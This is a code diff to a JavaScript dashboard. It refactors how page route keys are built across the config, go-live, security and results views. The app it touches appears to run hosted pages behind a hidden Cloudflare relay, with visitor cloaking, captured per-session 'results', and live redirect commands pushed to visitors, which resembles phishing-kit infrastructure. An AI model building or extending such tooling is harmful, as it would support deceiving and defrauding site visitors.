@@ -911,6 +911,7 @@ function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = n
 }
 
 function activeSessionCardMarkup(session, page, pageTargets = [], command = null) {
+  const routeKey = pageRouteKey(page);
   return `
     <article class="active-session-card">
       <div>
@@ -922,7 +923,7 @@ function activeSessionCardMarkup(session, page, pageTargets = [], command = null
         <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
         <span>${escapeHtml(commandStatusLabel(command))}</span>
       </div>
-      ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, sessionCurrentFlowLabel(session, null, command))}
+      ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, sessionCurrentFlowLabel(session, null, command))}
     </article>
   `;
 }
@@ -936,6 +937,7 @@ function latestSessionCommand(sessionId, sessionCommands = {}, sessionCommandHis
 }
 
 function sessionResultDetailMarkup(session, page) {
+  const routeKey = pageRouteKey(page);
   if (!session.results.length) {
     return `
       <article class="result-card compact">
@@ -967,12 +969,13 @@ function sessionResultDetailMarkup(session, page) {
           </div>
         `}
       </div>
-      ${resultActionsMarkup(result, page.slug)}
+      ${resultActionsMarkup(result, routeKey)}
     </article>
   `).join("");
 }
 
 function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], options = {}) {
+  const routeKey = pageRouteKey(page);
   const sessionIp = session.ip || session.results[session.results.length - 1]?.ip || "unknown";
   const ipStatus = bannedIps.includes(sessionIp) ? "Banned" : whitelistIps.includes(sessionIp) ? "Whitelisted" : "Unsorted";
   const lastDate = new Date(session.lastSeen);
@@ -1017,7 +1020,7 @@ function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], 
           <span>${escapeHtml(ipStatus)}</span>
           <span>${activeSession ? "Live now" : `Offline / ${escapeHtml(lastSeen)}`}</span>
         </div>
-        ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, currentFlowLabel)}
+        ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, currentFlowLabel)}
       </summary>
       <div class="session-result-timeline">
         ${sessionResultDetailMarkup(session, page)}
@@ -2240,7 +2243,7 @@ function renderDashboard() {
       title: page.name,
       meta: page.hostingConfig?.liveStatus || page.status || "active",
       value: `${pageLaunchReadiness(page).percent}% ready`,
-      route: `#config-${page.slug}`
+      route: `#config-${pageRouteKey(page)}`
     })),
     ...recentTransactions.map((transaction) => ({
       title: transaction.description || transaction.type || "Wallet activity",
@@ -2329,8 +2332,8 @@ function renderDashboard() {
           </div>
           <div class="dashboard-actions">
             ${nextPage ? `
-              <button type="button" class="primary" data-route="${topRisk ? escapeHtml(topRisk.risk.fix) : subscriptionAttention ? "#my-pages" : `#go-live-${escapeHtml(nextPage.slug)}`}">${topRisk ? escapeHtml(topRisk.risk.action) : subscriptionAttention ? "Renew" : "Go Live"}</button>
-              <button type="button" data-route="#config-${escapeHtml(nextPage.slug)}">Config</button>
+              <button type="button" class="primary" data-route="${topRisk ? escapeHtml(topRisk.risk.fix) : subscriptionAttention ? "#my-pages" : `#go-live-${escapeHtml(pageRouteKey(nextPage))}`}">${topRisk ? escapeHtml(topRisk.risk.action) : subscriptionAttention ? "Renew" : "Go Live"}</button>
+              <button type="button" data-route="#config-${escapeHtml(pageRouteKey(nextPage))}">Config</button>
             ` : `
               <button type="button" class="primary" data-route="${marketPages.length ? "#pages" : isAdmin() ? "#admin" : "#wallet"}">${marketPages.length ? "Browse pages" : isAdmin() ? "Open admin" : "Open wallet"}</button>
             `}
@@ -3303,6 +3306,7 @@ function pageLaunchReadiness(page) {
 }
 
 function pageRiskSignal(page) {
+  const routeKey = pageRouteKey(page);
   const hosting = page.hostingConfig || {};
   const security = page.securityConfig || {};
   const generated = page.generatedFile || {};
@@ -3333,7 +3337,7 @@ function pageRiskSignal(page) {
       layer: "Domain",
       code: "DOMAIN_MISSING",
       detail: "No live domain is connected to this page.",
-      fix: `#config-${page.slug}`,
+      fix: `#config-${routeKey}`,
       action: "Set domain"
     });
   } else if (!domainAllowed) {
@@ -3342,7 +3346,7 @@ function pageRiskSignal(page) {
       layer: "Security",
       code: "DOMAIN_NOT_ALLOWED",
       detail: "Saved security domains do not include the live domain.",
-      fix: `#security-${page.slug}`,
+      fix: `#security-${routeKey}`,
       action: "Fix allowlist"
     });
   }
@@ -3353,7 +3357,7 @@ function pageRiskSignal(page) {
       layer: "Host",
       code: "HOST_ORIGIN_MISSING",
       detail: "No host/origin target is saved for live relay checks.",
-      fix: `#go-live-${page.slug}`,
+      fix: `#go-live-${routeKey}`,
       action: "Open Go Live"
     });
   }
@@ -3364,7 +3368,7 @@ function pageRiskSignal(page) {
       layer: "Cloudflare",
       code: "WORKER_NOT_VERIFIED",
       detail: "Worker route or relay verification is not complete.",
-      fix: `#go-live-${page.slug}`,
+      fix: `#go-live-${routeKey}`,
       action: "Verify route"
     });
   }
@@ -3375,7 +3379,7 @@ function pageRiskSignal(page) {
       layer: "Runtime",
       code: "INDEX_NOT_GENERATED",
       detail: "Runtime index has not been generated after setup.",
-      fix: `#go-live-${page.slug}`,
+      fix: `#go-live-${routeKey}`,
       action: "Generate"
     });
   }
@@ -3386,7 +3390,7 @@ function pageRiskSignal(page) {
       layer: "Live status",
       code: "LIVE_STATUS_RED",
       detail: hosting.liveStatus,
-      fix: `#go-live-${page.slug}`,
+      fix: `#go-live-${routeKey}`,
       action: "Inspect"
     });
   }
@@ -3400,7 +3404,7 @@ function pageRiskSignal(page) {
     code: topIssue?.code || "LIVE_READY",
     detail: topIssue?.detail || "No operational issues detected from saved app data.",
     action: topIssue?.action || "Open",
-    fix: topIssue?.fix || `#go-live-${page.slug}`,
+    fix: topIssue?.fix || `#go-live-${routeKey}`,
     issues
   };
 }
@@ -3521,6 +3525,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
     renderMissingPage();
     return;
   }
+  const routeKey = pageRouteKey(page);
   const hosting = page.hostingConfig || {};
   const verifiedLabel = hosting.verified ? "Verified" : "Not verified";
   const liveStatus = hosting.liveStatus || "Setup required";
@@ -3606,7 +3611,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
       </div>
       ${viewNav([
         routeButton("#my-pages", "&#8592; My Pages", "primary"),
-        routeButton(`#config-${page.slug}`, "Config")
+        routeButton(`#config-${routeKey}`, "Config")
       ])}
 
       <div class="summary-grid go-live-summary">
@@ -3647,8 +3652,8 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             </select>
           </label>
           <div class="admin-actions">
-            <button type="button" data-route="#config-${page.slug}">Open Config</button>
-            <button type="button" data-save-hosting="${page.slug}">Save connection type</button>
+            <button type="button" data-route="#config-${routeKey}">Open Config</button>
+            <button type="button" data-save-hosting="${routeKey}">Save connection type</button>
           </div>
         </article>
 
@@ -3658,7 +3663,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
           <p>Enter the raw URL from the static host where the downloaded index.html is uploaded. The live domain remains ${displayDomain}.</p>
           <label><span>Raw host URL</span><input type="url" data-hosting-field="serverIp" value="${serverIp}" placeholder="https://your-static-host.example.com"></label>
           <div class="admin-actions">
-            <button type="button" data-save-hosting="${page.slug}">Save host URL</button>
+            <button type="button" data-save-hosting="${routeKey}">Save host URL</button>
           </div>
         </article>
 
@@ -3671,7 +3676,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             <div><span>02</span><strong>Relay</strong><em>Hidden backend</em><small>Cloudflare forwards runtime calls privately.</small></div>
           </div>
           <div class="admin-actions">
-            <button type="button" data-generate-relay-secret="${page.slug}">${relaySecret ? "Regenerate secret" : "Generate secret"}</button>
+            <button type="button" data-generate-relay-secret="${routeKey}">${relaySecret ? "Regenerate secret" : "Generate secret"}</button>
           </div>
         </article>
 
@@ -3688,15 +3693,15 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             <code>Browser calls: https://${displayDomain}/api/*</code>
           </div>
           <div class="admin-actions">
-            <button type="button" data-install-cloudflare="${page.slug}" ${hasDomain && hasRelaySecret ? "" : "disabled"}>Install Worker route</button>
-            <button type="button" data-verify-cloudflare="${page.slug}" ${hasDomain ? "" : "disabled"}>Verify zone</button>
+            <button type="button" data-install-cloudflare="${routeKey}" ${hasDomain && hasRelaySecret ? "" : "disabled"}>Install Worker route</button>
+            <button type="button" data-verify-cloudflare="${routeKey}" ${hasDomain ? "" : "disabled"}>Verify zone</button>
           </div>
           <details class="advanced-worker">
             <summary>Advanced manual Worker</summary>
             <p>Manual install is only for debugging. Managed install keeps normal users away from Worker code.</p>
-            <textarea class="worker-code-box" readonly data-worker-code="${page.slug}">${escapeHtml(workerScript)}</textarea>
+            <textarea class="worker-code-box" readonly data-worker-code="${routeKey}">${escapeHtml(workerScript)}</textarea>
             <div class="admin-actions">
-              <button type="button" data-copy-worker="${page.slug}" ${relaySecret ? "" : "disabled"}>Copy Worker script</button>
+              <button type="button" data-copy-worker="${routeKey}" ${relaySecret ? "" : "disabled"}>Copy Worker script</button>
             </div>
           </details>
         </article>
@@ -3719,7 +3724,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             `}
           </div>
           <div class="admin-actions">
-            <button type="button" data-verify-hosting="${page.slug}">Mark connection verified</button>
+            <button type="button" data-verify-hosting="${routeKey}">Mark connection verified</button>
           </div>
         </article>
 
@@ -3741,7 +3746,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             `}
           </div>
           <div class="admin-actions">
-            <button type="button" data-download-index="${page.slug}" ${readyToDownload ? "" : "disabled"}>Download index.html</button>
+            <button type="button" data-download-index="${routeKey}" ${readyToDownload ? "" : "disabled"}>Download index.html</button>
           </div>
         </article>
       </div>
@@ -4107,6 +4112,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
     renderMissingPage();
     return;
   }
+  const routeKey = pageRouteKey(page);
   const security = page.securityConfig;
   const turnstile = security.turnstile || {};
   const bannedIps = security.bannedIps || [];
@@ -4116,10 +4122,10 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
   const trafficLog = ["traffic", "log"].includes(tab) ? await fetchPageTraffic(page) : security.trafficLog || [];
   const trafficStats = trafficInsights(trafficLog);
   const tabButtons = [
-    routeButton(`#security-${page.slug}:security`, "Security", tab === "security" ? "primary" : ""),
-    routeButton(`#security-${page.slug}:ips`, "IP Rules", tab === "ips" ? "primary" : ""),
-    routeButton(`#security-${page.slug}:traffic`, "Traffic", tab === "traffic" ? "primary" : ""),
-    routeButton(`#security-${page.slug}:log`, "Log", tab === "log" ? "primary" : "")
+    routeButton(`#security-${routeKey}:security`, "Security", tab === "security" ? "primary" : ""),
+    routeButton(`#security-${routeKey}:ips`, "IP Rules", tab === "ips" ? "primary" : ""),
+    routeButton(`#security-${routeKey}:traffic`, "Traffic", tab === "traffic" ? "primary" : ""),
+    routeButton(`#security-${routeKey}:log`, "Log", tab === "log" ? "primary" : "")
   ];
   const captchaPanel = `
     <article class="security-panel">
@@ -4148,13 +4154,13 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
         <span>Banned IPs</span>
         <textarea data-security-field="bannedIps">${bannedIps.join("\n")}</textarea>
       </label>
-      ${ipRuleRowsMarkup(bannedIps, page.slug, "Banned IPs")}
+      ${ipRuleRowsMarkup(bannedIps, routeKey, "Banned IPs")}
       <label>
         <span>Whitelisted IPs</span>
         <textarea data-security-field="whitelistIps">${whitelistIps.join("\n")}</textarea>
       </label>
-      ${ipRuleRowsMarkup(whitelistIps, page.slug, "Whitelisted IPs")}
-      <button type="button" data-save-security="${page.slug}" data-save-security-tab="ips">Save IP rules</button>
+      ${ipRuleRowsMarkup(whitelistIps, routeKey, "Whitelisted IPs")}
+      <button type="button" data-save-security="${routeKey}" data-save-security-tab="ips">Save IP rules</button>
     </article>
   `;
   const devicePanel = `
@@ -4179,7 +4185,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
         `).join("")}
       </div>
       <p>Best protection is server-side User-Agent detection through your runtime API. It blocks common device classes, but advanced users can spoof their browser, so pair this with IP rules and captcha for stronger control.</p>
-      <button type="button" data-save-security="${page.slug}" data-save-security-tab="security">Save security rules</button>
+      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save security rules</button>
     </article>
   `;
   const proxyPanel = `
@@ -4201,7 +4207,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
           </label>
         `).join("")}
       </div>
-      <button type="button" data-save-security="${page.slug}" data-save-security-tab="security">Save shield</button>
+      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save shield</button>
     </article>
   `;
   const trafficPanel = `
@@ -4211,7 +4217,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
           <small>traffic</small>
           <h3>Visits and block counts</h3>
         </div>
-        <button type="button" data-route="#security-${page.slug}:traffic">Refresh</button>
+        <button type="button" data-route="#security-${routeKey}:traffic">Refresh</button>
       </div>
       <div class="metric-grid">
         <div><span>Total events</span><b>${trafficStats.total}</b></div>
@@ -4225,7 +4231,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
         ${trafficGraphMarkup(trafficStats)}
       </div>
       <div class="traffic-log">
-        ${trafficRowsMarkup(trafficLog, page.slug, bannedIps, whitelistIps)}
+        ${trafficRowsMarkup(trafficLog, routeKey, bannedIps, whitelistIps)}
       </div>
     </article>
   `;
@@ -4236,7 +4242,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
           <small>page log</small>
           <h3>What happened on this page</h3>
         </div>
-        <button type="button" data-route="#security-${page.slug}:log">Refresh</button>
+        <button type="button" data-route="#security-${routeKey}:log">Refresh</button>
       </div>
       <p>This log explains the real owner-side reason behind page activity. Visitors still only see ACCESS DENIED when a rule blocks them.</p>
       <div class="metric-grid">
@@ -4266,7 +4272,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
       </div>
       ${viewNav([
         routeButton("#my-pages", "&#8592; My Pages", "primary"),
-        routeButton(`#results-${page.slug}`, "Results"),
+        routeButton(`#results-${routeKey}`, "Results"),
         routeButton("#wallet", "Wallet")
       ])}
       ${viewNav(tabButtons)}
@@ -4288,6 +4294,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
     renderMissingPage();
     return;
   }
+  const routeKey = pageRouteKey(page);
   const previousSearch = options.autoRefresh ? preview.querySelector("[data-session-search-input]")?.value || "" : "";
   const previousFilter = options.autoRefresh ? preview.querySelector("[data-session-filter-button].is-active")?.dataset.sessionFilterButton || "live" : "live";
   const openSessionIds = options.autoRefresh
@@ -4296,7 +4303,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
         .filter(Boolean)
     : [];
   await loadResultsControlData(page, options);
-  if (options.autoRefresh && !isResultsRoute(page.slug)) return;
+  if (options.autoRefresh && !isResultsRoute(routeKey)) return;
   const results = page.results || [];
   const savedSessions = resultSessions(results);
   const activeSessions = page.activeSessions || [];
@@ -4326,7 +4333,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
       </div>
       ${viewNav([
         routeButton("#my-pages", "&#8592; My Pages", "primary"),
-        routeButton(`#security-${page.slug}:security`, "Security"),
+        routeButton(`#security-${routeKey}:security`, "Security"),
         routeButton("#wallet", "Wallet")
       ])}
 
@@ -4347,8 +4354,8 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
           </div>
           <div class="compact-center-actions">
             <span class="live-refresh-indicator" aria-live="polite">Auto-refresh 5s</span>
-            <button type="button" data-refresh-results="${page.slug}">Refresh</button>
-            <button type="button" data-route="#security-${page.slug}:traffic">Open traffic</button>
+            <button type="button" data-refresh-results="${routeKey}">Refresh</button>
+            <button type="button" data-route="#security-${routeKey}:traffic">Open traffic</button>
           </div>
         </div>
         <div class="compact-session-toolbar">
@@ -4406,7 +4413,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
     if (row) row.open = true;
   });
 
-  startResultsAutoRefresh(page.slug);
+  startResultsAutoRefresh(routeKey);
   statusText.textContent = options.autoRefresh ? `${page.name.toUpperCase()} RESULTS AUTO-REFRESHED` : `${page.name.toUpperCase()} RESULTS READY`;
   topbarTitle.textContent = `${page.name} Results`;
 }
@@ -4781,6 +4788,10 @@ themeToggle.addEventListener("click", () => {
 document.querySelector("[data-logout]")?.addEventListener("click", handleLogout);
 
 function saveSecurityConfig(page, tab = "security") {
+  if (!page) {
+    renderMissingPage();
+    return;
+  }
   const domainsField = preview.querySelector('[data-security-field="domains"]');
   const captchaField = preview.querySelector('[data-security-field="captcha"]');
   const turnstileSiteKeyField = preview.querySelector('[data-security-field="turnstileSiteKey"]');
@@ -4815,7 +4826,7 @@ function saveSecurityConfig(page, tab = "security") {
     vpnProxyRules
   });
   saveFlowState(page);
-  renderSecurityCenter(page.slug, tab);
+  renderSecurityCenter(pageRouteKey(page), tab);
   statusText.textContent = "SECURITY SETTINGS SAVED";
 }
 
@@ -4875,6 +4886,10 @@ function collectHostingFields(page) {
 }
 
 function saveHostingConfig(page, verify = false) {
+  if (!page) {
+    renderMissingPage();
+    return;
+  }
   const hosting = collectHostingFields(page);
   const hasRelay = hosting.connectionType === "cloudflare-worker";
   const isRenderStatic = hosting.hostingType === "render-static-site";
@@ -4903,7 +4918,7 @@ function saveHostingConfig(page, verify = false) {
   };
 
   saveFlowState(page);
-  renderGoLiveCenter(page.slug);
+  renderGoLiveCenter(pageRouteKey(page));
   statusText.textContent = verify
     ? hasMinimumConfig ? "HOSTING CONNECTION VERIFIED" : "DOMAIN AND SERVER IP REQUIRED"
     : "HOSTING SETTINGS SAVED";
@@ -4925,7 +4940,7 @@ function generateRelaySecretForPage(page) {
     apiBase: page.hostingConfig.connectionType === "cloudflare-worker" ? "/api" : page.hostingConfig.relayTarget
   };
   saveFlowState(page);
-  renderGoLiveCenter(page.slug);
+  renderGoLiveCenter(pageRouteKey(page));
   statusText.textContent = "CLOUDFLARE RELAY SECRET GENERATED";
 }
 
@@ -4954,7 +4969,7 @@ async function verifyCloudflareForPage(page) {
     });
     const updated = normalizeUserPage(result.userPage);
     ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
-    renderGoLiveCenter(updated.slug);
+    renderGoLiveCenter(pageRouteKey(updated));
     statusText.textContent = "CLOUDFLARE ZONE VERIFIED";
   } catch (error) {
     statusText.textContent = `CLOUDFLARE VERIFY FAILED: ${error.message}`.toUpperCase();
@@ -4980,7 +4995,7 @@ async function installCloudflareForPage(page) {
     });
     const updated = normalizeUserPage(result.userPage);
     ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
-    renderGoLiveCenter(updated.slug);
+    renderGoLiveCenter(pageRouteKey(updated));
     statusText.textContent = "CLOUDFLARE WORKER INSTALLED";
   } catch (error) {
     statusText.textContent = `CLOUDFLARE INSTALL FAILED: ${error.message}`.toUpperCase();
@@ -5888,7 +5903,7 @@ preview.addEventListener("click", async (event) => {
         body: JSON.stringify({ ip })
       });
       applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
-      await renderSecurityCenter(resultPage.slug, "ips");
+      await renderSecurityCenter(pageRouteKey(resultPage), "ips");
       statusText.textContent = `${ip} REMOVED FROM IP RULES`;
     }).catch((error) => {
       statusText.textContent = `IP REMOVE FAILED: ${error.message}`.toUpperCase();
@@ -5911,7 +5926,7 @@ preview.addEventListener("click", async (event) => {
         body: JSON.stringify({ ip })
       });
       applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
-      await renderSecurityCenter(resultPage.slug, "traffic");
+      await renderSecurityCenter(pageRouteKey(resultPage), "traffic");
       statusText.textContent = isBan ? `${ip} BANNED` : `${ip} WHITELISTED`;
     }).catch((error) => {
       statusText.textContent = `IP ACTION FAILED: ${error.message}`.toUpperCase();
@@ -5950,11 +5965,11 @@ preview.addEventListener("click", async (event) => {
       });
       const updated = normalizeUserPage(result.userPage);
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
-      await renderResultsCenter(updated.slug);
+      await renderResultsCenter(pageRouteKey(updated));
       statusText.textContent = "LIVE USER REDIRECT QUEUED";
       window.setTimeout(() => {
-        const latest = getPageBySlug(updated.slug);
-        if (latest) renderResultsCenter(updated.slug);
+        const latest = getPageBySlug(pageRouteKey(updated));
+        if (latest) renderResultsCenter(pageRouteKey(updated));
       }, 5500);
     }).catch((error) => {
       statusText.textContent = `REDIRECT FAILED: ${error.message}`.toUpperCase();
@@ -5974,7 +5989,7 @@ preview.addEventListener("click", async (event) => {
       });
       const updated = normalizeUserPage(result.userPage);
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
-      await renderResultsCenter(updated.slug);
+      await renderResultsCenter(pageRouteKey(updated));
       statusText.textContent = "LIVE USER COMMAND CLEARED";
     }).catch((error) => {
       statusText.textContent = `CLEAR FAILED: ${error.message}`.toUpperCase();
@@ -5998,7 +6013,7 @@ preview.addEventListener("click", async (event) => {
       await withButtonBusy(resultAction, "Deleting", async () => {
         await requestApi(`/api/user-pages/${resultPage.id}/results/${encodeURIComponent(result.id)}`, { method: "DELETE" });
         resultPage.results = resultPage.results.filter((item) => item.id !== result.id);
-        await renderResultsCenter(resultPage.slug);
+        await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = "RESULT DELETED";
       });
       return;
@@ -6011,7 +6026,7 @@ preview.addEventListener("click", async (event) => {
           body: JSON.stringify({ ip: result.ip })
         });
         applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
-        await renderResultsCenter(resultPage.slug);
+        await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = `${result.ip} BANNED`;
       });
       return;
@@ -6024,7 +6039,7 @@ preview.addEventListener("click", async (event) => {
           body: JSON.stringify({ ip: result.ip })
         });
         applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
-        await renderResultsCenter(resultPage.slug);
+        await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = `${result.ip} WHITELISTED`;
       });
       return;
